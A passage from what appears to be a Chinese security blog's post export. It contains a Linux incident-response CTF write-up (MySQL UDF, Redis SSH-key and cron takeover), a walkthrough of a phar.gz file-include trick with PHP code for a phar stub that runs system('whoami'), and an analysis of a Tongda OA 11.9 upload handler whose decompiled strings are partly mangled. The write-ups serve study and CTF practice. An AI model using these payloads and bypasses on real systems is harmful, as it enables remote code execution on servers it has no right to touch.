5.5.64，不在此漏洞的影响版本内，也可以排除掉\nUDF提权的文章：https://hilang.cloud/mysql-%e6%8f%90%e6%9d%83/\nUDF 提权是基于自定义函数实现的，而自定义函数的前提是 UDF 的动态链接库文件放置于 MySQL 安装目录下的lib\\plugin文件夹，故我们需要登录 Mysql 对 plugin 关键字进行排查，在web目录下的common.php发现mysql连接的账号密码\nroot@xuanji:/var/log/mysql# cat /var/www/html/common.php&lt;?php$conn=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;334cc35b3c704593&quot;,&quot;cms&quot;,&quot;3306&quot;);if(!$conn)&#123;echo &quot;数据库连接失败&quot;;&#125;\n\n连接mysql\nmysql -uroot -p334cc35b3c704593\n\n之后对 plugin 关键词进行排查，显示所有与 plugin 相关的系统变量\nshow variables like &#x27;%plugin%&#x27;;\n\n\n\n确实存在udf.so文件，文件路径/usr/lib/mysql/plugin/udf.so\nflag&#123;b1818bde4e310f3d23f1005185b973e7&#125;\n\n黑客获取的权限使用ps -aux查看进程的详细信息，可以看到提权文件的运行后的权限为mysql，故 Flag 为 mysql\nflag&#123;mysql&#125;\n\n第二章日志分析-redis应急响应分析黑客攻击成功的 IP 为多少先分析redis日志，路径/var/log/redis.log\n\nflag&#123;192.168.100.20&#125;\n\n分析黑客第一次上传的恶意文件分析日志\n\n发现有个.&#x2F;exp.so\ncat /exp.so | grep -a &quot;flag&#123;&quot;\n\n\nflag&#123;XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b&#125;\n\n分析黑客反弹 shell 的IP 为多少对于redis数据库提权一般来说有4种方法\n\n写密钥ssh\n计划任务\n反弹shell\nCVE-2022-0543 沙盒绕过命令执行 （集成在template当中）\n\n这里面可以先排除反弹shell与CVE-2022-0543 因为反弹shell很容易出问题导致连接失败。\n先看下有没有写公钥\ncat /root/.ssh/authorized_keys\n\n\n可以看到是写了公钥的。但仅靠公钥我们是找不到反弹Ip的\n再查看计划任务\ncrontab -l\n\n\nflag&#123;192.168.100.13&#125;\n\n溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串由上一步已经得知用户名为xj-test-user\n用用户名去github里面搜索https://github.com/xj-test-user/redis-rogue-getshell\n\nflag&#123;xj-test-user-wow-you-find-flag&#125;\n\n分析黑客篡改的命令大多数Linux命令都是编译后的二进制可执行文件\n这些可执行文件一般放置于 &#x2F;bin、&#x2F;sbin、&#x2F;usr&#x2F;bin、&#x2F;usr&#x2F;sbin 等目录中\n我们到&#x2F;bin目录 按照时间顺序查看最新的文件\ncat /bin/ps\n\n\nflag&#123;c195i2923381905517d818e313792d196&#125;\n\n","categories":["应急响应"],"tags":["应急响应"]},{"title":"最新最热phar.gz","url":"/2025/09/18/%E6%9C%80%E6%96%B0%E6%9C%80%E7%83%ADphar-gz/","content":"前言在之前的湾区杯和国际赛中出现了phar反序列化配合文件上传进行rce的操作,对其学习的同时, 发现了一个比较不错的姿势, 它可以包含文件内容没有 php 代码的文件, 但是能够进行代码执行, 并且对文件名称毫无要求..(基于 ..&#x2F; 跳目录的姿势)\n过程分析先来个例题,DeadsecCTF2025 baby-web\n简单来说就是一个php文件包含的trick，当上传文件逻辑判断把能够写马的关键词全部ban了，这个时候怎么才能写马上传\n源码如下:\n&lt;?phpsession_start();error_reporting(0);if (!isset($_SESSION[&#x27;dir&#x27;])) &#123;    $_SESSION[&#x27;dir&#x27;] = random_bytes(4);&#125;if (!isset($_GET[&#x27;url&#x27;])) &#123;    die(&quot;Nope :&lt;&quot;);&#125;$include_url = basename($_GET[&#x27;url&#x27;]);$SANDBOX = getcwd() . &quot;/uploads/&quot; . md5(&quot;supersafesalt!!!!@#$&quot; . $_SESSION[&#x27;dir&#x27;]);if (!file_exists($SANDBOX)) &#123;    mkdir($SANDBOX);&#125;if (!file_exists($SANDBOX . &#x27;/&#x27; . $include_url)) &#123;    die(&quot;Nope :&lt;&quot;);&#125;if (!preg_match(&quot;/\\.(zip|bz2|gz|xz|7z)/i&quot;, $include_url)) &#123;    die(&quot;Nope :&lt;&quot;);&#125;@include($SANDBOX . &#x27;/&#x27; . $include_url);?&gt;\n\n&lt;?phpsession_start();error_reporting(0);$allowed_extensions = [&#x27;zip&#x27;, &#x27;bz2&#x27;, &#x27;gz&#x27;, &#x27;xz&#x27;, &#x27;7z&#x27;];$allowed_mime_types = [    &#x27;application/zip&#x27;,    &#x27;application/x-bzip2&#x27;,    &#x27;application/gzip&#x27;,    &#x27;application/x-gzip&#x27;,    &#x27;application/x-xz&#x27;,    &#x27;application/x-7z-compressed&#x27;,];function filter($tempfile)&#123;    $data = file_get_contents($tempfile);    if (        stripos($data, &quot;__HALT_COMPILER();&quot;) !== false || stripos($data, &quot;PK&quot;) !== false ||        stripos($data, &quot;&lt;?&quot;) !== false || stripos(strtolower($data), &quot;&lt;?php&quot;) !== false    ) &#123;        return true;    &#125;    return false;&#125;if (!isset($_SESSION[&#x27;dir&#x27;])) &#123;    $_SESSION[&#x27;dir&#x27;] = random_bytes(4);&#125;$SANDBOX = getcwd() . &quot;/uploads/&quot; . md5(&quot;supersafesalt!!!!@#$&quot; . $_SESSION[&#x27;dir&#x27;]);if (!file_exists($SANDBOX)) &#123;    mkdir($SANDBOX);&#125;if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &#x27;POST&#x27;) &#123;    if (is_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;])) &#123;        if (filter($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]) || !isset($_FILES[&#x27;file&#x27;][&#x27;name&#x27;])) &#123;            die(&quot;Nope :&lt;&quot;);        &#125;        // mimetype check        $finfo = finfo_open(FILEINFO_MIME_TYPE);        $mime_type = finfo_file($finfo, $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);        finfo_close($finfo);        if (!in_array($mime_type, $allowed_mime_types)) &#123;            die(&#x27;Nope :&lt;&#x27;);        &#125;        // ext check        $ext = strtolower(pathinfo(basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]), PATHINFO_EXTENSION));        if (!in_array($ext, $allowed_extensions)) &#123;            die(&#x27;Nope :&lt;&#x27;);        &#125;        if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], &quot;$SANDBOX/&quot; . basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]))) &#123;            echo &quot;File upload success!&quot;;        &#125;    &#125;&#125;?&gt;&lt;form enctype=&#x27;multipart/form-data&#x27; action=&#x27;upload.php&#x27; method=&#x27;post&#x27;&gt;    &lt;input type=&#x27;file&#x27; name=&#x27;file&#x27;&gt;    &lt;input type=&quot;submit&quot; value=&quot;upload&quot;&gt;&lt;/p&gt;&lt;/form&gt;\n\n第一个部分是文件包含,第二个部分是文件上传。文件包含的部分完全没有可控点，因为使用的basename。\n同理，文件上传的部分也完全没有办法绕过。首先因为是个白名单，完全没有利用痕迹\n其次，对文件的内容做了限制：\nfunction filter($tempfile)&#123;    $data = file_get_contents($tempfile);    if (        stripos($data, &quot;__HALT_COMPILER();&quot;) !== false || stripos($data, &quot;PK&quot;) !== false ||        stripos($data, &quot;&lt;?&quot;) !== false || stripos(strtolower($data), &quot;&lt;?php&quot;) !== false    ) &#123;        return true;    &#125;    return false;&#125;\n\n文件里的内容不能包含__HALT_COMPILER();,PK,&lt;?,&lt;?php\n&lt;?, &lt;?php：PHP 代码片段__HALT_COMPILER();:PHP 特殊函数， phar利用\n\n然后再看看文件包含的限制\n目录穿越不考虑，因为用的是basename\nif (!file_exists($SANDBOX)) &#123;    mkdir($SANDBOX);&#125;if (!file_exists($SANDBOX . &#x27;/&#x27; . $include_url)) &#123;    die(&quot;Nope :&lt;&quot;);&#125;if (!preg_match(&quot;/\\.(zip|bz2|gz|xz|7z)/i&quot;, $include_url)) &#123;    die(&quot;Nope :&lt;&quot;);&#125;\n\n沙箱目录存在；\n文件存在；\n文件扩展名必须是 zip &#x2F; bz2 &#x2F; gz &#x2F; xz &#x2F; 7z\n绕过解读+无 php 代码 RCE我们先给出绕过的方法，下面进行分析，这样更容易明白这个漏洞的巧妙之处\n首先制作一个 phar的文件\n&lt;?php$phar = new Phar(&#x27;test.phar&#x27;);$phar-&gt;startBuffering();$stub = &lt;&lt;&lt;&#x27;STUB&#x27;\t&lt;?php\tsystem(&#x27;whoami&#x27;);\t__HALT_COMPILER();\t?&gt;\tSTUB;$phar-&gt;setStub($stub);$phar-&gt;stopBuffering();?&gt;\n\n需要在php.ini里改掉phar.readonly &#x3D; Off\n我们先来看一下没有压缩过的phar文件的内容\n\n可以看到,还是有上面的过滤字符,这样肯定是过不了waf的,再来对这个phar文件进行gzip压缩\ngzip -c test.phar &gt; test.phar.gz\n\n\n再次查看得到的phar.gz文件,发现已经没有危险字符\n此刻实际上test.phar.gz文件中不含&lt;?php等敏感关键字, 即可 RCE\n前提则是被包含的文件内容必须存在.phar关键字才行.\n原因分析对phar文件的处理\nstatic zend_op_array *phar_compile_file(zend_file_handle *file_handle, int type) /* &#123;&#123;&#123; */&#123;    zend_op_array *res;    char *name = NULL;    int failed;    phar_archive_data *phar;    if (!file_handle || !file_handle-&gt;filename) &#123;        return phar_orig_compile_file(file_handle, type);    &#125;    if (strstr(file_handle-&gt;filename, &quot;.phar&quot;) &amp;&amp; !strstr(file_handle-&gt;filename, &quot;://&quot;)) &#123;        if (SUCCESS == phar_open_from_filename((char*)file_handle-&gt;filename, strlen(file_handle-&gt;filename), NULL, 0, 0, &amp;phar, NULL)) &#123;            if (phar-&gt;is_zip || phar-&gt;is_tar) &#123;                zend_file_handle f = *file_handle;                /* zip or tar-based phar */                spprintf(&amp;name, 4096, &quot;phar://%s/%s&quot;, file_handle-&gt;filename, &quot;.phar/stub.php&quot;);                if (SUCCESS == phar_orig_zend_open((const char *)name, &amp;f)) &#123;                    efree(name);                    name = NULL;                    f.filename = file_handle-&gt;filename;                    if (f.opened_path) &#123;                        efree(f.opened_path);                    &#125;                    f.opened_path = file_handle-&gt;opened_path;                    f.free_filename = file_handle-&gt;free_filename;                    switch (file_handle-&gt;type) &#123;                        case ZEND_HANDLE_STREAM:                            if (file_handle-&gt;handle.stream.closer &amp;&amp; file_handle-&gt;handle.stream.handle) &#123;                                file_handle-&gt;handle.stream.closer(file_handle-&gt;handle.stream.handle);                            &#125;                            file_handle-&gt;handle.stream.handle = NULL;                            break;                        default:                            break;                    &#125;                    *file_handle = f;                &#125;            &#125; else if (phar-&gt;flags &amp; PHAR_FILE_COMPRESSION_MASK) &#123;                zend_file_handle_dtor(file_handle);                /* compressed phar */                file_handle-&gt;type = ZEND_HANDLE_STREAM;                /* we do our own reading directly from the phar, don&#x27;t change the next line */                file_handle-&gt;handle.stream.handle  = phar;                file_handle-&gt;handle.stream.reader  = phar_zend_stream_reader;                file_handle-&gt;handle.stream.closer  = NULL;                file_handle-&gt;handle.stream.fsizer  = phar_zend_stream_fsizer;                file_handle-&gt;handle.stream.isatty  = 0;                phar-&gt;is_persistent ?                    php_stream_rewind(PHAR_G(cached_fp)[phar-&gt;phar_pos].fp) :                    php_stream_rewind(phar-&gt;fp);            &#125;        &#125;    &#125;    zend_try &#123;        failed = 0;        CG(zend_lineno) = 0;        res = phar_orig_compile_file(file_handle, type);    &#125; zend_catch &#123;        failed = 1;        res = NULL;    &#125; zend_end_try();    if (name) &#123;        efree(name);    &#125;    if (failed) &#123;        zend_bailout();    &#125;    return res;&#125;\n\n判断的条件\nif (strstr(file_handle-&gt;filename, &quot;.phar&quot;) &amp;&amp; !strstr(file_handle-&gt;filename, &quot;://&quot;))\n\n首先检查文件的拓展名是不是.phar,再看是不是以phar://协议存在,如果都不存在的话,则认为它是本地的phar文件\n所以只要是带有phar字符,例如1.phar.jpg都是可以的\n关键是下面的代码\n使用的 phar_open_from_filename 去处理\nif (SUCCESS == phar_open_from_filename(ZSTR_VAL(file_handle-&gt;filename), ZSTR_LEN(file_handle-&gt;filename), NULL, 0, 0, &amp;phar, NULL)) &#123;\t\t\tif (phar-&gt;is_zip || phar-&gt;is_tar) &#123;\t\t\t\tzend_file_handle f;\t\t\t\t/* zip or tar-based phar */\t\t\t\tname = zend_strpprintf(4096, &quot;phar://%s/%s&quot;, ZSTR_VAL(file_handle-&gt;filename), &quot;.phar/stub.php&quot;);\t\t\t\tzend_stream_init_filename_ex(&amp;f, name);\t\t\t\tif (SUCCESS == zend_stream_open_function(&amp;f)) &#123;\t\t\t\t\tzend_string_release(f.filename);\t\t\t\t\tf.filename = file_handle-&gt;filename;\t\t\t\t\tif (f.opened_path) &#123;\t\t\t\t\t\tzend_string_release(f.opened_path);\t\t\t\t\t&#125;\t\t\t\t\tf.opened_path = file_handle-&gt;opened_path;\n\n读取文件内容:\nint phar_open_from_filename(char *fname, size_t fname_len, char *alias, size_t alias_len, uint32_t options, phar_archive_data** pphar, char **error) /* &#123;&#123;&#123; */&#123;    php_stream *fp;    zend_string *actual;    int ret, is_data = 0;    if (error) &#123;        *error = NULL;    &#125;    if (!strstr(fname, &quot;.phar&quot;)) &#123;        is_data = 1;    &#125;    if (phar_open_parsed_phar(fname, fname_len, alias, alias_len, is_data, options, pphar, error) == SUCCESS) &#123;        return SUCCESS;    &#125; else if (error &amp;&amp; *error) &#123;        return FAILURE;    &#125;    if (php_check_open_basedir(fname)) &#123;        return FAILURE;    &#125;    fp = php_stream_open_wrapper(fname, &quot;rb&quot;, IGNORE_URL|STREAM_MUST_SEEK, &amp;actual);    if (!fp) &#123;        if (options &amp; REPORT_ERRORS) &#123;            if (error) &#123;                spprintf(error, 0, &quot;unable to open phar for reading \\&quot;%s\\&quot;&quot;, fname);            &#125;        &#125;        if (actual) &#123;            zend_string_release_ex(actual, 0);        &#125;        return FAILURE;    &#125;    if (actual) &#123;        fname = ZSTR_VAL(actual);        fname_len = ZSTR_LEN(actual);    &#125;    ret =  phar_open_from_fp(fp, fname, fname_len, alias, alias_len, options, pphar, is_data, error);    if (actual) &#123;        zend_string_release_ex(actual, 0);    &#125;    return ret;&#125;\n\nphar_open_from_fp：\nstatic int phar_open_from_fp(php_stream* fp, char *fname, size_t fname_len, char *alias, size_t alias_len, uint32_t options, phar_archive_data** pphar, int is_data, char **error) /* &#123;&#123;&#123; */&#123;    const char token[] = &quot;__HALT_COMPILER();&quot;;    const char zip_magic[] = &quot;PK\\x03\\x04&quot;;    const char gz_magic[] = &quot;\\x1f\\x8b\\x08&quot;;    const char bz_magic[] = &quot;BZh&quot;;    char *pos, test = &#x27;\\0&#x27;;    const int window_size = 1024;    char buffer[1024 + sizeof(token)]; /* a 1024 byte window + the size of the halt_compiler token (moving window) */    const zend_long readsize = sizeof(buffer) - sizeof(token);    const zend_long tokenlen = sizeof(token) - 1;    zend_long halt_offset;    size_t got;    uint32_t compression = PHAR_FILE_COMPRESSED_NONE;    if (error) &#123;        *error = NULL;    &#125;    if (-1 == php_stream_rewind(fp)) &#123;        MAPPHAR_ALLOC_FAIL(&quot;cannot rewind phar \\&quot;%s\\&quot;&quot;)    &#125;    buffer[sizeof(buffer)-1] = &#x27;\\0&#x27;;    memset(buffer, 32, sizeof(token));    halt_offset = 0;    /* Maybe it&#x27;s better to compile the file instead of just searching,  */    /* but we only want the offset. So we want a .re scanner to find it. */    while(!php_stream_eof(fp)) &#123;        if ((got = php_stream_read(fp, buffer+tokenlen, readsize)) &lt; (size_t) tokenlen) &#123;            MAPPHAR_ALLOC_FAIL(&quot;internal corruption of phar \\&quot;%s\\&quot; (truncated entry)&quot;)        &#125;        if (!test) &#123;            test = &#x27;\\1&#x27;;            pos = buffer+tokenlen;            if (!memcmp(pos, gz_magic, 3)) &#123;                char err = 0;                php_stream_filter *filter;                php_stream *temp;                /* to properly decompress, we have to tell zlib to look for a zlib or gzip header */                zval filterparams;                if (!PHAR_G(has_zlib)) &#123;                    MAPPHAR_ALLOC_FAIL(&quot;unable to decompress gzipped phar archive \\&quot;%s\\&quot; to temporary file, enable zlib extension in php.ini&quot;)                &#125;                array_init(&amp;filterparams);/* this is defined in zlib&#x27;s zconf.h */#ifndef MAX_WBITS#define MAX_WBITS 15#endif                add_assoc_long_ex(&amp;filterparams, &quot;window&quot;, sizeof(&quot;window&quot;) - 1, MAX_WBITS + 32);                /* entire file is gzip-compressed, uncompress to temporary file */                if (!(temp = php_stream_fopen_tmpfile())) &#123;                    MAPPHAR_ALLOC_FAIL(&quot;unable to create temporary file for decompression of gzipped phar archive \\&quot;%s\\&quot;&quot;)                &#125;                php_stream_rewind(fp);                filter = php_stream_filter_create(&quot;zlib.inflate&quot;, &amp;filterparams, php_stream_is_persistent(fp));                if (!filter) &#123;                    err = 1;                    add_assoc_long_ex(&amp;filterparams, &quot;window&quot;, sizeof(&quot;window&quot;) - 1, MAX_WBITS);                    filter = php_stream_filter_create(&quot;zlib.inflate&quot;, &amp;filterparams, php_stream_is_persistent(fp));                    zend_array_destroy(Z_ARR(filterparams));                    if (!filter) &#123;                        php_stream_close(temp);                        MAPPHAR_ALLOC_FAIL(&quot;unable to decompress gzipped phar archive \\&quot;%s\\&quot;, ext/zlib is buggy in PHP versions older than 5.2.6&quot;)                    &#125;                &#125; else &#123;                    zend_array_destroy(Z_ARR(filterparams));                &#125;                php_stream_filter_append(&amp;temp-&gt;writefilters, filter);                if (SUCCESS != php_stream_copy_to_stream_ex(fp, temp, PHP_STREAM_COPY_ALL, NULL)) &#123;                    if (err) &#123;                        php_stream_close(temp);                        MAPPHAR_ALLOC_FAIL(&quot;unable to decompress gzipped phar archive \\&quot;%s\\&quot;, ext/zlib is buggy in PHP versions older than 5.2.6&quot;)                    &#125;                    php_stream_close(temp);                    MAPPHAR_ALLOC_FAIL(&quot;unable to decompress gzipped phar archive \\&quot;%s\\&quot; to temporary file&quot;)                &#125;                php_stream_filter_flush(filter, 1);                php_stream_filter_remove(filter, 1);                php_stream_close(fp);                fp = temp;                php_stream_rewind(fp);                compression = PHAR_FILE_COMPRESSED_GZ;                /* now, start over */                test = &#x27;\\0&#x27;;                continue;            &#125; else if (!memcmp(pos, bz_magic, 3)) &#123;                php_stream_filter *filter;                php_stream *temp;                if (!PHAR_G(has_bz2)) &#123;                    MAPPHAR_ALLOC_FAIL(&quot;unable to decompress bzipped phar archive \\&quot;%s\\&quot; to temporary file, enable bz2 extension in php.ini&quot;)                &#125;                /* entire file is bzip-compressed, uncompress to temporary file */                if (!(temp = php_stream_fopen_tmpfile())) &#123;                    MAPPHAR_ALLOC_FAIL(&quot;unable to create temporary file for decompression of bzipped phar archive \\&quot;%s\\&quot;&quot;)                &#125;                php_stream_rewind(fp);                filter = php_stream_filter_create(&quot;bzip2.decompress&quot;, NULL, php_stream_is_persistent(fp));                if (!filter) &#123;                    php_stream_close(temp);                    MAPPHAR_ALLOC_FAIL(&quot;unable to decompress bzipped phar archive \\&quot;%s\\&quot;, filter creation failed&quot;)                &#125;                php_stream_filter_append(&amp;temp-&gt;writefilters, filter);                if (SUCCESS != php_stream_copy_to_stream_ex(fp, temp, PHP_STREAM_COPY_ALL, NULL)) &#123;                    php_stream_close(temp);                    MAPPHAR_ALLOC_FAIL(&quot;unable to decompress bzipped phar archive \\&quot;%s\\&quot; to temporary file&quot;)                &#125;                php_stream_filter_flush(filter, 1);                php_stream_filter_remove(filter, 1);                php_stream_close(fp);                fp = temp;                php_stream_rewind(fp);                compression = PHAR_FILE_COMPRESSED_BZ2;                /* now, start over */                test = &#x27;\\0&#x27;;                continue;            &#125;            if (!memcmp(pos, zip_magic, 4)) &#123;                php_stream_seek(fp, 0, SEEK_END);                return phar_parse_zipfile(fp, fname, fname_len, alias, alias_len, pphar, error);            &#125;            if (got &gt; 512) &#123;                if (phar_is_tar(pos, fname)) &#123;                    php_stream_rewind(fp);                    return phar_parse_tarfile(fp, fname, fname_len, alias, alias_len, pphar, is_data, compression, error);                &#125;            &#125;        &#125;        if (got &gt; 0 &amp;&amp; (pos = phar_strnstr(buffer, got + sizeof(token), token, sizeof(token)-1)) != NULL) &#123;            halt_offset += (pos - buffer); /* no -tokenlen+tokenlen here */            return phar_parse_pharfile(fp, fname, fname_len, alias, alias_len, halt_offset, pphar, compression, error);        &#125;        halt_offset += got;        memmove(buffer, buffer + window_size, tokenlen); /* move the memory buffer by the size of the window */    &#125;    MAPPHAR_ALLOC_FAIL(&quot;internal corruption of phar \\&quot;%s\\&quot; (__HALT_COMPILER(); not found)&quot;)&#125;\t\n\n对这两个函数总结:\n\n从文件指针 fp 打开一个 .phar 文件并解析其结构，识别格式（phar&#x2F;tar&#x2F;zip&#x2F;gz&#x2F;bz2），找到 __HALT_COMPILER();，并初始化 phar_archive_data。\n它可以去解析各种压缩的形式，最后如果整个文件都没找到 __HALT_COMPILER();，就报错\n如果检测到 zip magic，交由 phar_parse_zipfile() 来处理\n如果文件结构像 TAR，就使用 phar_parse_tarfile() 解析。\n\n就是无论怎么压缩,函数都会自动帮我们解压,gz文件也不例外\n","categories":["php ctf_tricks"],"tags":["php phar php反序列化"]},{"title":"通达OA11.9漏洞分析","url":"/2025/09/23/%E9%80%9A%E8%BE%BEOA11-9%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","content":"准备工作源码下载地址:https://cdndown.tongda2000.com/oa/2019/TDOA11.9.exe\n然后准备好解密工具:SeayDzend.exe\n漏洞分析前台文件上传点文件位置:/mobile/api/api.ali.php,代码如下:\n&lt;?phpinclude_once &quot;inc/conn.php&quot;;include_once &quot;inc/td_ali/api.ali.class.php&quot;;include_once &quot;inc/utility_file.php&quot;;$ATTACHMENTS = upload(&quot;file&quot;, &quot;approve_center&quot;);if (is_array($ATTACHMENTS)) &#123;\t$id = rtrim($ATTACHMENTS[&quot;ID&quot;], &quot;,&quot;);\t$name = rtrim($ATTACHMENTS[&quot;NAME&quot;], &quot;*&quot;);\t$FILE_PATH = attach_real_path($id, $name);\t$FILE_PATH = str_replace(&quot;\\\\&quot;, &quot;/&quot;, $FILE_PATH);\t$image = file_get_contents($FILE_PATH);\t$AliOrc = new AliOrc();\t$data = $AliOrc-&gt;vat_invoice($image);\techo $data;&#125;?&gt;\n\n跟进一下upload函数\nunction upload($PREFIX, $MODULE, $OUTPUT)&#123;\tif (strstr($MODULE, &quot;/&quot;) || strstr($MODULE, &quot;\\\\&quot;)) &#123;\t\tif (!$OUTPUT) &#123;\t\t\treturn _(&quot;???????��???????&quot;);\t\t&#125;\t\tMessage(_(&quot;????&quot;), _(&quot;???????��???????&quot;));\t\texit();\t&#125;\t$ATTACHMENTS = array(&quot;ID&quot; =&gt; &quot;&quot;, &quot;NAME&quot; =&gt; &quot;&quot;);\treset($_FILES);\tforeach ($_FILES as $KEY =&gt; $ATTACHMENT ) &#123;\t\tif (($ATTACHMENT[&quot;error&quot;] == 4) || (($KEY != $PREFIX) &amp;&amp; (substr($KEY, 0, strlen($PREFIX) + 1) != $PREFIX . &quot;_&quot;))) &#123;\t\t\tcontinue;\t\t&#125;\t\t$data_charset = (isset($_GET[&quot;data_charset&quot;]) ? $_GET[&quot;data_charset&quot;] : (isset($_POST[&quot;data_charset&quot;]) ? $_POST[&quot;data_charset&quot;] : &quot;&quot;));\t\t$ATTACH_NAME = ($data_charset != &quot;&quot; ? td_iconv($ATTACHMENT[&quot;name&quot;], $data_charset, MYOA_CHARSET) : $ATTACHMENT[&quot;name&quot;]);\t\t$ATTACH_NAME = filename_valid($ATTACH_NAME);\t\t$ATTACH_SIZE = $ATTACHMENT[&quot;size&quot;];\t\t$ATTACH_ERROR = $ATTACHMENT[&quot;error&quot;];\t\t$ATTACH_FILE = $ATTACHMENT[&quot;tmp_name&quot;];\t\t$ERROR_DESC = &quot;&quot;;\t\tif ($ATTACH_ERROR == UPLOAD_ERR_OK) &#123;\t\t\tif (!is_uploadable($ATTACH_NAME)) &#123;\t\t\t\t$ERROR_DESC = sprintf(_(&quot;????????????[%s]?????&quot;), substr($ATTACH_NAME, strrpos($ATTACH_NAME, &quot;.&quot;) + 1));\t\t\t&#125;\t\t\t$encode = mb_detect_encoding($ATTACH_NAME, array(&quot;ASCII&quot;, &quot;UTF-8&quot;, &quot;GB2312&quot;, &quot;GBK&quot;, &quot;BIG5&quot;));\t\t\tif ($encode != &quot;UTF-8&quot;) &#123;\t\t\t\t$ATTACH_NAME_UTF8 = mb_convert_encoding($ATTACH_NAME, &quot;utf-8&quot;, $encode);\t\t\t&#125;\t\t\telse &#123;\t\t\t\t$ATTACH_NAME_UTF8 = $ATTACH_NAME;\t\t\t&#125;\t\t\tif (preg_match(&quot;/[\\&#x27;:&lt;&gt;?]|\\/|\\\\\\\\|\\&quot;|\\|/u&quot;, $ATTACH_NAME_UTF8)) &#123;\t\t\t\t$ERROR_DESC = sprintf(_(&quot;?????[%s]????[/\\&#x27;\\&quot;:*?&lt;&gt;|]???????&quot;), $ATTACH_NAME);\t\t\t&#125;\t\t\tif ($ATTACH_SIZE == 0) &#123;\t\t\t\t$ERROR_DESC = sprintf(_(&quot;???[%s]??��?0???&quot;), $ATTACH_NAME);\t\t\t&#125;\t\t\tif ($ERROR_DESC == &quot;&quot;) &#123;\t\t\t\t$ATTACH_ID = add_attach($ATTACH_FILE, $ATTACH_NAME, $MODULE);\t\t\t\tif ($ATTACH_ID === false) &#123;\t\t\t\t\t$ERROR_DESC = sprintf(_(&quot;???[%s]??????&quot;), $ATTACH_NAME);\t\t\t\t&#125;\t\t\t\telse &#123;\t\t\t\t\t$ATTACHMENTS[&quot;ID&quot;] .= $ATTACH_ID . &quot;,&quot;;\t\t\t\t\t$ATTACHMENTS[&quot;NAME&quot;] .= $ATTACH_NAME . &quot;*&quot;;\t\t\t\t&#125;\t\t\t&#125;\t\t\t@td_unlink(ATTACH_FILE);\t\t&#125;\t\telse if ($ATTACH_ERROR == UPLOAD_ERR_INI_SIZE) &#123;\t\t\t$ERROR_DESC = sprintf(_(&quot;???[%s]???��?????????????%s??&quot;), $ATTACH_NAME, ini_get(&quot;upload_max_filesize&quot;));\t\t&#125;\t\telse if ($ATTACH_ERROR == UPLOAD_ERR_FORM_SIZE) &#123;\t\t\t$ERROR_DESC = sprintf(_(&quot;???[%s]???��????????????&quot;), $ATTACH_NAME);\t\t&#125;\t\telse if ($ATTACH_ERROR == UPLOAD_ERR_PARTIAL) &#123;\t\t\t$ERROR_DESC = sprintf(_(&quot;???[%s]?????????&quot;), $ATTACH_NAME);\t\t&#125;\t\telse if ($ATTACH_ERROR == UPLOAD_ERR_NO_TMP_DIR) &#123;\t\t\t$ERROR_DESC = sprintf(_(&quot;???[%s]????????????????????&quot;), $ATTACH_NAME);\t\t&#125;\t\telse if ($ATTACH_ERROR == UPLOAD_ERR_CANT_WRITE) &#123;\t\t\t$ERROR_DESC = sprintf(_(&quot;???[%s]��?????&quot;), $ATTACH_NAME);\t\t&#125;\t\telse &#123;\t\t\t$ERROR_DESC = sprintf(_(&quot;��?????[????%s]&quot;), $ATTACH_ERROR);\t\t&#125;\t\tif ($ERROR_DESC != &quot;&quot;) &#123;\t\t\tif (!$OUTPUT) &#123;\t\t\t\tdelete_attach($ATTACHMENTS[&quot;ID&quot;], $ATTACHMENTS[&quot;NAME&quot;], $MODULE);\t\t\t\treturn $ERROR_DESC;\t\t\t&#125;\t\t\telse &#123;\t\t\t\tMessage(_(&quot;????&quot;), $ERROR_DESC);\t\t\t\texit();\t\t\t&#125;\t\t&#125;\t&#125;\treturn $ATTACHMENTS;&#125;\n\n有些编码问题不知道啥情况,转换一下直接把乱码变成问号了\n再跟进一下is_uploadable函数\nfunction is_uploadable($FILE_NAME, $checkpath, $func_name)&#123;\t$EXT_NAME = &quot;&quot;;\t$POS = strrpos($FILE_NAME, &quot;.&quot;);\tif ($POS === false) &#123;\t\t$EXT_NAME = $FILE_NAME;\t&#125;\telse &#123;\t\t$EXT_NAME = strtolower(substr($FILE_NAME, $POS + 1));\t\t$EXT_NAME = filename_valid($EXT_NAME);\t\tif ((td_trim($EXT_NAME) == &quot;&quot;) || (td_trim(strtolower(substr($EXT_NAME, 0, 3))) == &quot;php&quot;)) &#123;\t\t\treturn false;\t\t&#125;\t&#125;\tif ($checkpath &amp;&amp; !td_path_valid($FILE_NAME, $func_name)) &#123;\t\treturn false;\t&#125;\tif (find_id(MYOA_UPLOAD_FORBIDDEN_TYPE, $EXT_NAME)) &#123;\t\treturn false;\t&#125;\tif (MYOA_UPLOAD_LIMIT == 0) &#123;\t\treturn true;\t&#125;\telse if (MYOA_UPLOAD_LIMIT == 1) &#123;\t\treturn !find_id(MYOA_UPLOAD_LIMIT_TYPE, $EXT_NAME);\t&#125;\telse if (MYOA_UPLOAD_LIMIT == 2) &#123;\t\treturn find_id(MYOA_UPLOAD_LIMIT_TYPE, $EXT_NAME);\t&#125;\telse &#123;\t\treturn false;\t&#125;&#125;\n\n可以看到会检查上传的文件的后缀是不是php,我们在本地发送个包看看(图是偷的,本地起不了环境)\n\n其中2203是取的日期,后面一串是随机的字符串,看一下是在哪里生成的这串字符串\n定位到add_attach函数\nif (!file_exists($SOURCE_FILE)) &#123;\treturn false;&#125;if ($MODULE == &quot;&quot;) &#123;\t$MODULE = attach_sub_dir();&#125;if ($YM == &quot;&quot;) &#123;\t$YM = date(&quot;ym&quot;);&#125;$PATH = $ATTACH_PATH_ACTIVE . $MODULE;if (!file_exists($PATH) || !is_dir($PATH)) &#123;\t@mkdir($PATH, 448);&#125;$PATH = $PATH . &quot;/&quot; . $YM;if (!file_exists($PATH) || !is_dir($PATH)) &#123;\t@mkdir($PATH, 448);&#125;$ATTACH_NAME = (is_default_charset($ATTACH_NAME) ? $ATTACH_NAME : iconv(&quot;utf-8&quot;, \t\tMYOA_CHARSET, $ATTACH_NAME));$EXT_NAME = substr($ATTACH_NAME, 